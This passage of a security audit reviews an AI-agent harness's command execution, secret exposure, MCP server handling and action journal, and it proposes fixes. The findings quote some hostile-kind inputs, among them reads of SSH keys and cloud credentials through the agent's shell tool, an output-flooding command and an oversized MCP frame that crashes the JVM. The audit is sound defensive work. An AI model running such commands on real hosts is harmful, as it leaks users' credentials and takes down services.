1. **No tree kill.** `proc.destroyForcibly()` terminates the immediate child. On Windows that is `cmd.exe`; the command it launched (`mvnw.cmd` → `java.exe`, `npm.cmd` → `node.exe`, `gradlew.bat`) is a *grandchild* and keeps running — still writing to disk, still holding ports, still consuming the outer gate's budget. The repo contains no `ProcessHandle.descendants()`, no `taskkill /T /F`, no Job Object usage:

```
grep 'descendants\(\)|taskkill|ProcessHandle' over D:\AI\miniagent\**\*.java → No matches found
```

The code is aware of the symptom — the recovery hint at `ToolConcurrencyPolicy.java:171-174` tells the model *"命令进程可能仍在后台运行。先跑一条只读命令核验（如 tasklist / pgrep -a java）"* — i.e. orphaned processes are an expected, user-visible outcome. Same defect on the MCP path (`McpStdioClient.java:297`: `process.destroyForcibly()` with no join, no descendants).

2. **`future.cancel(true)` cannot stop a process.** The task runs on a virtual thread. `cancel(true)` interrupts it; `Process.waitFor(long, TimeUnit)` is interruptible, and the tool's own `catch (Exception e)` at `BuiltinTools.java:1470-1472` would report a failure — but only if the outer gate fires *before* the inner one, which the 15s margin is designed to prevent. If the outer gate fires anyway (e.g. `agent.tools.timeout-overrides` shrank the budget, or `LoopTurnContext.actionTimeoutSeconds` capped it — `AgentLoop.java:1691-1698`), the interrupt path never reaches `destroyForcibly()`, so the child is abandoned outright. A `TimeUnit`-blocked read of the drainer's stream is likewise not reliably interruptible.

3. **`drainer.join(2000)` output race.** `BuiltinTools.java:1465` waits at most 2s for the drainer after the process exits. A child that buffers heavily and exits can leave output unread and silently missing from the result.

**Remediation.** Capture `ProcessHandle.of(proc.pid())` and on timeout call `descendants().forEach(ProcessHandle::destroyForcibly)` before the parent, or use a Windows Job Object (`CREATE_NEW_PROCESS_GROUP` + `taskkill /T`). On the outer gate, propagate cancellation into the tool (`Thread.interrupt` + a `finally` that force-kills) rather than relying on the future's cancel flag.

### TO-02 — [P1] Command output is buffered **unbounded** in the JVM heap

**Evidence**

`BuiltinTools.java:1433-1446`
```java
1433:            final java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
1434:            Thread drainer = new Thread(() -> {
1435:                try (var in = proc.getInputStream()) {
1436:                    byte[] chunk = new byte[8192];
1437:                    int n;
1438:                    while ((n = in.read(chunk)) != -1) {
1439:                        synchronized (buf) { buf.write(chunk, 0, n); }
1440:                    }
1441:                } catch (Exception ignored) {
...
1446:            drainer.start();
```

`ByteArrayOutputStream` grows to the full output size with no cap; the only limit in the loop is the process's own lifetime. Truncation to `MAX_INLINE_OUTPUT_CHARS = 6000` (`BuiltinTools.java:1352`) and `MAX_TIMEOUT_PARTIAL_CHARS = 2000` (`1358`) happens **after** the buffer is fully built (`1493`, `1454-1456`), so it bounds what the model sees, not what the JVM allocates.

**Why it matters.** `ExecCommandParams.MAX_TIMEOUT_SECONDS = 600` (`ExecCommandParams.java:33`). `exec_command {"command":"yes"}` or `find /` or a runaway build log can emit hundreds of MB to GB within that window; `ByteArrayOutputStream` doubling means transiently 2× that. This is a trivially reachable `OutOfMemoryError` that kills the whole agent process, not just the call. The `synchronized (buf)` block also serialises the drainer against the reader, and the full `new String(buf.toByteArray(), cs)` at `1468` doubles peak memory again.

**Remediation.** Cap at the drainer: stop writing past e.g. 1 MiB into memory and stream the overflow straight to the `_tool-output` file (the persistence sink already exists at `BuiltinTools.java:1528-1545`). Kill the process once a hard cap is exceeded.

### TO-03 — [P2] No CPU / memory / disk quota on children

**Evidence.** `ProcessBuilder` is used everywhere with no resource controls (`BuiltinTools.java:1406`, `HostCommand.java:112`, `McpStdioClient.java:56`, `BrowserService.java:970/1049/1092`, `RenderDiagramTool.java:171`). The only limits are wall-clock timeouts. A command may fork an unbounded number of processes, allocate all RAM, or fill the disk. **UNVERIFIED** whether the deployment wraps the JVM in an OS-level container/job-object quota — I found no such wrapping in-repo, but did not inspect packaging scripts (`scripts/`, `.github/`) for that purpose.

**Remediation.** At minimum a concurrency cap on concurrently-spawned children and a disk-usage check before write-heavy commands; properly, a container/Job Object per tool call.

---

## Q6 — Secrets

Covered substantively by **CMD-04** (env inheritance) and **CMD-05**/**NET-03** (host file + metadata reach). Consolidated statement:

- **Child environments are not stripped.** `BuiltinTools.java:1405-1418` (additive only), `HostCommand.java:112`, `McpStdioClient.java:56-59`. Every credential the JVM holds is readable by the child. `env`/`printenv` are whitelisted as read-only (`CommandReadOnlyJudge.java:52`) so this is also *classifiable as safe*.
- **Arbitrary host file read is reachable three ways.** `read_file`/`list_files` via `resolveReadPath`'s absolute branch (`BuiltinTools.java:1248-1250`), `search_code`/`edit_file` via `resolveSearchPath` (`BuiltinTools.java:419-421`), and `exec_command` via the shell (`type C:\Users\…\.ssh\id_rsa`, `cat ~/.ssh/id_rsa` — note `cat` is in `READ_ONLY_COMMANDS` at `CommandReadOnlyJudge.java:45`). `~/.ssh/id_rsa`, `~/.aws/credentials`, and any `.env` are all in scope; `DANGEROUS_PATTERN` only guards `/etc/passwd` and `/etc/shadow` (`BuiltinTools.java:1307`), which is the wrong threat model on a Windows-first product.
- **Secret material is written to disk unredacted.** `BuiltinTools.java:1538` persists the raw command line; `ToolPipeline.java:310-313` journals `argumentsHash` (safe, it's a digest) but `ActionJournalEntry.message` (1000 chars, `ActionJournalEntry.java:18`) can carry tool output fragments. `redactSensitive` (`BuiltinTools.java:1302-1304`) is applied to log lines only.

---

## Q7 — MCP trust and robustness

### MCP-01 — [P1] MCP servers are spawned with an arbitrary command and the full inherited environment, with no trust boundary

**Evidence**

`McpStdioClient.java:47-61`
```java
47:    public static McpStdioClient start(McpProperties.Server cfg) throws Exception {
48:        if (StringUtils.isBlank(cfg.getCommand())) {
49:            throw new IllegalArgumentException("MCP server " + cfg.getId() + " 缺少 command");
50:        }
51:        List<String> cmd = new ArrayList<>();
52:        cmd.add(cfg.getCommand());
53:        if (Objects.nonNull(cfg.getArgs())) {
54:            cmd.addAll(cfg.getArgs());
55:        }
56:        ProcessBuilder pb = new ProcessBuilder(cmd);
57:        if (Objects.nonNull(cfg.getEnv()) && !cfg.getEnv().isEmpty()) {
58:            pb.environment().putAll(cfg.getEnv());
59:        }
```

There is no allow-list of commands, no path pinning, no signature/hash check, and no `environment().clear()`. `cfg.getEnv()` is merged *into* the inherited environment, so a server is granted everything the agent has (provider keys, DB credentials) plus anything the config adds.

Registration grants MCP tools full standing — `mcp__<server>__<tool>` (`McpToolBridge.java:141-150`) with whatever JSON schema the server itself advertises (`McpStdioClient.schemaToParams`, `261-287`) and no side-effect/idempotency declaration:

`McpToolBridge.java:145-150`
```java
145:            toolRegistry.register(Tool.builder()
146:                    .name(regName)
147:                    .description(desc)
148:                    .parameters(params)
149:                    .handler(args -> invoke(serverId, toolName, args))
150:                    .build());
```

so an `mcp__` tool lands on `ToolExecutionProfile.DEFAULT` (`ToolConcurrencyPolicy.profileOf` default branch, `ToolConcurrencyPolicy.java:262`) — 60s gate, `GLOBAL` serialisation, `ABORT` on timeout (the most disruptive recovery, per `ToolTimeoutRecovery.java:53-59`).

**Partial credit:** MCP tools *are* treated as ask-dangerous by name (`PermissionPolicy.java:48-51`: any `mcp__` prefix → `isAskDangerous` true). But that only produces a prompt in `PermissionMode.ASK`; under the default mode (`PermissionPolicy.needsSessionGrant` falls through to `return "http_post".equals(toolName)` at `122`) MCP tools run unprompted. And once granted, PERM-01 applies again: the grant is name-scoped, so approving one MCP tool approves that tool forever.

### MCP-02 — [P1] The JSON-RPC read loop has no frame-size bound — a malicious server can OOM the JVM

**Evidence**

`McpStdioClient.java:200-233`
```java
200:    private JsonNode readOneMessage(InputStream in) throws Exception {
201:        ByteArrayOutputStream lineBuf = new ByteArrayOutputStream();
202:        int contentLength = -1;
203:        while (true) {
204:            int b = in.read();
...
208:            if (b == '\n') {
...
221:                if (line.regionMatches(true, 0, "Content-Length:", 0, 15)) {
222:                    contentLength = Integer.parseInt(line.substring(15).trim());
223:                    continue;
224:                }
...
212:                    if (contentLength >= 0) {
213:                        byte[] body = in.readNBytes(contentLength);
214:                        if (body.length < contentLength) {
215:                            return null;
216:                        }
217:                        return MAPPER.readTree(body);
```

Defects, all in this ~35-line method:
1. **`contentLength` is unvalidated.** `Integer.parseInt` accepts up to `2147483647`; there is no `> MAX_FRAME` rejection and no negative check (`-1` is treated as "no content-length" and falls through to the NDJSON path, silently desynchronising the stream). A server (or a compromised/typosquatted npm MCP server) sending `Content-Length: 2000000000` makes `in.readNBytes(contentLength)` attempt a 2 GB allocation → `OutOfMemoryError`. The catch at `189-192` catches `Exception`, but **`OutOfMemoryError` is an `Error` and escapes**, taking down the JVM and every session on it.
2. **No bound on header lines.** `lineBuf` (`201`) accumulates byte-by-byte with no cap; a server that never sends `\n` grows it without limit — same OOM, no `Content-Length` needed.
3. **Errors desync the channel permanently.** A malformed `Content-Length` (`Integer.parseInt` throws) propagates out of `readOneMessage` → out of `readLoop` (`189`) → the loop exits and `finally` (`193-196`) completes *all* pending futures exceptionally (`194`) and clears the map. The client is then permanently dead but `McpToolBridge.clients` still holds it (`McpToolBridge.java:36`), so every subsequent call reports a generic failure with no path to reconnect (reconnect only happens via `refreshServer`, `McpToolBridge.java:87-117`).
4. **`\r`-less NDJSON vs frame desync.** If a server emits a bare JSON object without `Content-Length`, `line.startsWith("{")` (`225`) parses it as one message — fine — but any leading whitespace or a BOM makes it fall through to "other headers ignored", silently swallowing the message.

### MCP-03 — [P2] Handshake/request timeouts leak `pending` entries and do not bound the blocking read

**Evidence**

`McpStdioClient.java:146-159` + `75` + `110`
```java
146:    private CompletableFuture<JsonNode> request(String method, JsonNode params) throws Exception {
147:        long id = nextId.getAndIncrement();
148:        CompletableFuture<JsonNode> fut = new CompletableFuture<>();
149:        pending.put(id, fut);
...
157:        writeFrame(msg);
158:        return fut;
159:    }
```
```java
75:        request("initialize", params).get(30, TimeUnit.SECONDS);
110:        JsonNode result = request("tools/call", params).get(120, TimeUnit.SECONDS);
```

When `get(...)` times out, the `pending` entry is **not** removed — cleanup only happens on a matching response (`handleMessage`, `241`) or on loop exit (`194-196`). Every timed-out MCP call therefore leaks a `CompletableFuture` and its `id` forever. Conversely, `readOneMessage` blocks in raw `in.read()` with **no read timeout**, so a server that accepts the handshake then goes silent parks the virtual read thread indefinitely; the 30s/120s `get` timeouts bound the *caller*, not the read.

**Also good here, and worth keeping:** `writeFrame` is `synchronized` (`171`), `stderr` is drained on its own thread (`255-259`) so a chatty server can't fill its pipe and deadlock, and `handleMessage` correctly ignores unsolicited notifications (`239-252`).

**Remediation.** Cap frame size (`MAX_FRAME_BYTES`, reject `contentLength < 0 || > MAX`), cap header-line length, `pending.remove(id)` in a `finally`/timeout branch, wrap `readOneMessage` in a deadline, and reconnect the client on read-loop exit instead of leaving a zombie in `clients`.

---

## Q8 — Idempotency / journal crash-recovery semantics

### JRN-01 — [P2] An interrupted action is permanently blocked, and the reconciliation queue is dead code

**Evidence — the UNKNOWN freeze**

`ToolPipeline.java:230-247`
```java
230:            Optional<ActionJournalEntry> previous = actionJournal.latest(key);
231:            if (previous.isPresent()) {
232:                ActionJournalEntry entry = previous.get();
233:                if (entry.status() == ActionExecutionStatus.UNKNOWN
234:                        || entry.status() == ActionExecutionStatus.RUNNING) {
235:                    return ToolResult.unknown("动作已有未确认执行记录，禁止自动重试", null);
236:                }
```

and `ActionExecutionStatus` makes `UNKNOWN` absorbing:

`ActionExecutionStatus.java:24`
```java
24:            case SUCCEEDED, CANCELLED, UNKNOWN -> EnumSet.noneOf(ActionExecutionStatus.class);
```

**Evidence — recovery is write-only**

`FileActionJournal.java:44-49` converts leftover `RUNNING` to `UNKNOWN` at startup:
```java
44:            for (ActionJournalEntry entry : latest.values().stream()
45:                    .filter(e -> e.status() == ActionExecutionStatus.RUNNING).toList()) {
46:                append(new ActionJournalEntry(entry.key(), entry.toolName(), entry.argumentsHash(),
47:                        ActionExecutionStatus.UNKNOWN, entry.attempt(), System.currentTimeMillis(),
48:                        "OUTCOME_UNKNOWN", "进程在工具终态前退出；需人工核验", ""));
```

but `ActionJournal.unresolved()` — the *only* way to enumerate that queue — has **no production caller**:

```
grep 'unresolved\(\)|actionJournal' over D:\AI\miniagent\**\*.java
→ ToolPipeline.java:56,73,80,230,310 (no unresolved call)
→ FileActionJournal.java:74 (the implementation)
→ ActionJournal.java:9 (the interface)
→ test InMemoryActionJournal.java:26
```

There is no HTTP endpoint, no scheduler, no CLI that calls it. "需人工核验" (needs manual verification) is unactionable: the journal is a file under the data dir, and nothing surfaces it to a UI or operator.

**Why it matters.** The locking is sound (`FileActionJournal.append` is `synchronized`, `61` enforces the transition table, and turning `RUNNING`→`UNKNOWN` at startup is the correct conservative choice rather than assuming success or failure). But the *consequence* is a permanent, silent hard-block. If the process is killed while `exec_command` is mid-flight, then on restart that idempotency key — `(sessionId, planVersion, nodeId, sha256(name+"\n"+args))` for the non-fenced path (`ToolPipeline.java:301-303`) — can never run again, for the life of the data dir. The model receives `ToolResult.unknown("动作已有未确认执行记录，禁止自动重试")`, and per the established contract `OUTCOME_UNKNOWN` **aborts the whole turn** (`ToolTimeoutRecovery.java:53-59`); so a single crash mid-command can permanently poison a session, or at minimum that action, with no operator remedy.

A second, subtler problem: `ToolPipeline.java:237-239` treats a prior `SUCCEEDED` as a successful dedup:
```java
237:                if (entry.status() == ActionExecutionStatus.SUCCEEDED) {
238:                    return ToolResult.success("{\"success\":true,\"deduplicated\":true}");
239:                }
```
This is correct for genuinely idempotent actions. Since the key includes the argument hash *and* the turn number, re-issuing the *same* command in a *different* turn gets a fresh key — so the dedup does not actually prevent re-running a mutating command across turns, which is the case it is presumably meant to catch. **UNVERIFIED** whether that's intended; it is at least not what a reader would infer from "禁止自动重试".

### JRN-02 — [P2] Journal grows without bound and is loaded entirely into memory at startup

**Evidence**

`FileActionJournal.java:25, 31-43, 56-71`
```java
25:    private final Map<ActionJournalKey, ActionJournalEntry> latest = new ConcurrentHashMap<>();
...
31:    @PostConstruct
32:    void initialize() {
33:        try {
34:            Files.createDirectories(journalFile.getParent());
35:            if (Files.exists(journalFile)) {
36:                for (String line : Files.readAllLines(journalFile, StandardCharsets.UTF_8)) {
```

`Files.readAllLines` loads the **entire** file into a `List<String>` before iterating; every entry ever written is retained in `latest` forever; there is no rotation, truncation, or compaction. This is an append-only JSONL file where every tool call of every session appends ≥3 lines (`PLANNED`/`READY` + `RUNNING` + terminal — `ToolPipeline.java:246-255, 281`). Startup cost and heap grow linearly and permanently with lifetime call volume.

Also note the two `JSON.readValue` calls per line at `FileActionJournal.java:40` — the line is parsed twice (the second call can throw where the first did not, in principle), and `catch (Exception ignored)` at `41` logs a warning claiming "跳过损坏的 Action Journal 记录" while `log.warn("跳过损坏的 Action Journal 记录: {}", journalFile)` omits the line content and the cause, so corruption is undiagnosable.

**Remediation.** Rotate the journal (size/age), keep only non-terminal + recent-terminal states in memory (`unresolved()` only needs `UNKNOWN`; `latest()` needs the most recent per key), and stream startup with a `BufferedReader`. Build the reconciliation path — surface `unresolved()` through an API with an explicit operator "mark resolved as FAILED / assume SUCCEEDED" action, which is the only way JRN-01 becomes survivable.

### JRN-03 — [P3] Journal appends are not fsync'd, and a failed init aborts application startup

**Evidence**

`FileActionJournal.java:64-70`
```java
64:        try {
65:            Files.writeString(journalFile, JSON.writeValueAsString(entry) + System.lineSeparator(),
66:                    StandardCharsets.UTF_8, StandardOpenOption.CREATE, StandardOpenOption.APPEND);
67:            latest.put(entry.key(), entry);
68:        } catch (Exception e) {
69:            throw new IllegalStateException("写入 Action Journal 失败: " + journalFile, e);
70:        }
```

`Files.writeString` returns once the data is in the OS page cache; there is no `FileChannel.force(true)` or `StandardOpenOption.DSYNC`. For a journal whose entire purpose is to survive an unclean shutdown, a power loss can lose the terminal record of an action that *did* execute — after which the pre-crash `RUNNING` record (also possibly lost) is the only trace, or no trace at all. Meanwhile `initialize()` wraps all failures in `IllegalStateException` (`FileActionJournal.java:50-52`), so an unwritable/oversized journal file prevents the whole application from starting — a single point of failure for a component that is supposed to be advisory. Fail-safe direction is arguable, but a full disk should not brick the agent.

---

## Already solid (verified, keep these)

These are real engineering wins; I checked each rather than assuming, and several are better than the equivalent in mainstream agent CLIs.

1. **`NetworkGuard`'s address classifier** (`NetworkGuard.java:110-230`) is genuinely thorough and correctly ordered: `getRawUserInfo()` rejection (69-71), zone-ID rejection (72-75), trailing-dot and bracket normalization before matching (220-230), host-name blocklist *then* DNS resolution of **every** returned address (91-103), and an `InetAddress`-based classifier covering RFC1918, CGNAT `100.64/10`, link-local, multicast, `>=224`, ULA `fc00::/7`, `fe80::/10`, `2001:db8::/32`, `2001:2::/32`, `2002::/16`, plus explicit IPv4-mapped *and* IPv4-compatible inheritance (172-178). The integer/octal forms the brief asks about are rejected upstream because `URI.getHost()` returns null for them — correct outcome by a slightly accidental route.
2. **`GuardedHttpClient`'s redirect loop** (`GuardedHttpClient.java:112-157`) is the right architecture — manual redirects, `requireAllowed` on every hop (113, 140), HTTPS→HTTP downgrade refusal (141-144), cross-origin credential stripping (145-147), `readBounded` size enforcement (180-191), `Location`-less 3xx handled (124-129), method/body downgrade on 303 and POST-302 (148-154), and a hard cap on `maxRedirects` at construction (66-73). It is unused (NET-02) — but it is correct and should be adopted, not rewritten.
3. **`ShellCommandLine`'s wrapper expansion** (`ShellCommandLine.java:17-26, 97-140`) is a genuinely non-obvious correct insight: `bash -c "rm -rf x && ls"` must be expanded so the inner segments are judged individually, and the code does exactly that with a depth cap (`MAX_WRAPPER_DEPTH = 3`, line 58) to prevent parser blowup. Quoted-aware splitting (223-252), `2>&1`/`&>` not being mistaken for a background operator (267-277), and path/extension stripping for `C:\tools\rg.exe` → `rg` (381-398) are all correct.
4. **`CommandReadOnlyJudge`'s conservative-by-default posture** (`CommandReadOnlyJudge.java:21-38`) is the right bias, and the specific rejections are thought through: `find -exec/-delete/-fprint` (`WRITE_FLAGS_ANY`, 73-76), `sort -o` limited to `sort` because `grep -o` is read-only (78-84, 228-236), `git branch/tag/config/remote` requiring an explicit read flag (98-109, 190-198), and never-terminating `tail -f`/bare `ping` excluded (36-37, 167-174). Its weaknesses (CMD-02) are seam-level, not design-level.
5. **`ActionExecutionStatus`'s transition table** (`ActionExecutionStatus.java:15-27`) is an explicit, enforced state machine — `FileActionJournal.append` refuses illegal transitions (61-63) and refuses a non-`PLANNED` first state (58-60). Converting leftover `RUNNING` → `UNKNOWN` at startup (44-49) is the correct conservative recovery choice and refuses the tempting wrong answer (assume success/failure). The `latest`-per-key in-memory index also makes `latest()` O(1). The defect (JRN-01) is the missing *exit* from `UNKNOWN`, not the model.
6. **The inner/outer timeout invariant** is enforced mechanically rather than by convention: `ToolExecutionProfile.withBudget(gate - profile.outerGateMarginSeconds())` (`ToolExecutionGuards.java:136-148`) with `exec_command` explicitly excluded from name-level overrides (`169-173`) and startup self-checks that warn-and-ignore rather than silently apply malformed config (`156-178`). The comment at `ToolExecutionGuards.java:37-43` documenting the precedence order is accurate against the code.
7. **Bounded lock acquisition with correct release ordering.** `ToolExecutionGuards.executeGuarded` (`187-213`) uses `tryAcquire(lockWaitSeconds)` on both the global semaphore and the striped resource lock, tracks `resourceAcquired` so a mid-way bailout does not release a lock it never took, and releases in reverse order. The corresponding distinction — "didn't get the lock" ⇒ zero side effects ⇒ safely retryable `RESOURCE_BUSY`, never `OUTCOME_UNKNOWN` (`ToolPipeline.java:266-270`) — is a subtle and correct call.
8. **Argument-blind authorization is at least *consistently* applied for tool-surface gating.** `ToolPipeline.invoke` checks `allowedTools` (117-125), the planner hard gate (140-146), plan-mode read-only surface (149-155), the `BLOCK` hard gate *before* the ask path (174-182, with a comment explaining exactly why the order matters), and `browser_evaluate`'s config kill-switch (107-116) — each before any side effect. The problem is the *granularity* of the grant (Q3), not the ordering of the checks.
9. **MCP plumbing details that are easy to get wrong and are right here:** stderr drained on a dedicated thread to avoid pipe-fill deadlock (`McpStdioClient.java:255-259`); `writeFrame` synchronized so concurrent callers cannot interleave frames (`171-178`); unsolicited notify/request messages ignored rather than mis-correlated (`239-252`); `schemaToParams` defensively typed (`261-287`); `McpStdioClient.close()` fails all pending futures so no caller hangs forever (`294-300`).
10. **Non-zero exit codes are not blindly treated as failures** (`CommandSemantics.java:40-67, 113-135`) with the write/read sides sharing one constant (`TOLERATED_EXIT_PREFIX`, 79) specifically to prevent the classic "two copies of a literal drift apart" bug, and the rationale (avoid the model pointlessly retrying `grep` exit 1 until the `allFailedRepeated` gate kills the turn, 11-18) is a real production failure mode correctly diagnosed.

---

## Priority order for remediation

| # | ID | Sev | One-line fix |
|---|---|---|---|
| 1 | FS-01 | P0 | Route `edit_file`/`search_code` through the confined resolver; add realpath + reparse-point checks |
| 2 | CMD-01 | P0 | Remove the `ACCEPT_EDITS → ALLOW` promotion for `exec_command` |
| 3 | PERM-01 | P0 | Key grants on `(tool, argDigest, cwd)`; add scopes, expiry, and an approval audit log |
| 4 | NET-02 | P1 | Adopt the already-written `GuardedHttpClient`; delete the raw `HttpClient` fields |
| 5 | NET-03 | P1 | Delete `isPrivateHost`; call `NetworkGuard.validateUrl` from `web_extract` |
| 6 | CMD-04 | P1 | `environment().clear()` + allow-list for every child process |
| 7 | CMD-05 | P1 | `effectiveWorkspaceRoot()` in `execCommand` |
| 8 | TO-01 | P1 | Tree-kill (`descendants()`/Job Object) on all timeout paths |
| 9 | TO-02 | P1 | Cap the drainer buffer; stream overflow to disk |
| 10 | MCP-02 | P1 | Bound Content-Length and header-line length |
| 11 | CMD-03 | P1 | Delete the denylist; move to argv mode + executable allow-list |
| 12 | CMD-02 | P1 | Remove the `--version`/`--help`/`-h` short-circuit that precedes the whitelist |
| 13 | MCP-01 | P1 | Trust boundary for MCP servers: command allow-list, stripped env, declared contracts |
| 14 | JRN-01/02 | P2 | Build the `unresolved()` reconciliation path; rotate the journal |
| 15 | NET-04 | P2 | Pin the validated IP through to connect |
| 16 | MCP-03 | P2 | `pending.remove` on timeout; read deadline |
| 17 | TO-03, JRN-03 | P2/P3 | Quotas; `FileChannel.force`; don't brick startup on journal errors |
